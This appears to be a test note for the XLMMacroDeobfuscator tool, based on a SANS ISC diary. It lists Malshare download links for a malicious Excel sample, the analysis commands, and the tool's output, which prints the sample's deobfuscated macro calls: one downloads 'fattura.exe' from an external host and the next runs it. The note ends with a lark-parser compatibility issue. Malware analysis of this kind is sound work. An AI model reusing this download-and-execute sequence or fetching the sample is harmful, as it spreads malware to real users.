Test1 based on Dider Stevens diary https://isc.sans.edu/diary/Excel+4+Macro+Analysis+XLMMacroDeobfuscator/26110

1) download malware sample from Malshare (need to register)
https://malshare.com/sample.php?action=detail&hash=0be6ece31de89f3efb4125e086416ffc
https://malshare.com/sampleshare.php?action=getfile&hash=01558388b33abe05f25afb6e96b0c899221fe75b037c088fa60fe8bbf668f606

2) (OPTIONAL) check that it really contains the obfuscated code in the worksheet cells (using the DidierStevensSuite)
This step is optional as this particular sample IS obfuscated and was already publicly analyzed
$ zipdump.py -s 5 -d 01558388b33abe05f25afb6e96b0c899221fe75b037c088fa60fe8bbf668f606.xlsx |xmldump.py celltext| grep -e CALL
BC1986,"CALL($EB$661,$AE$429,$FK$1459,0,$BB$54,$CB$1256,0,0)",0
BC1987,"CALL($BO$1913,$GM$1203,$CF$742,0,$IO$1228,$GC$1642,,0,0)",0

3) check that the xlmdeobfuscator really gives the deobfuscated value
$ xlmdeobfuscator -f 01558388b33abe05f25afb6e96b0c899221fe75b037c088fa60fe8bbf668f606.xlsx | grep -e CALL
CELL:BC1986    , FullEvaluation      , CALL("URLMON","URLDownloadToFileA","JJCCJJ",0,"http://service.pandtelectric.com/fattura.exe","C:\ProgramData\jeTneVi.exe",0,0)
CELL:BC1987    , FullEvaluation      , CALL("Shell32","ShellExecuteA","JJCCCCJ",0,"Open","C:\ProgramData\jeTneVi.exe",,0,0)


TODO:
Note there is issue with the lark API compatibility.
The xlmdeobfuscator works with old lark-parser (0.12).
The lark-parser was renamed to lark, has much bigger versions now (1.1.9 in fedora 41), but ends with error.
Workaround now is to install the lark-parser locally .. pip3 install lark-parser.
More in issue_lark.txt

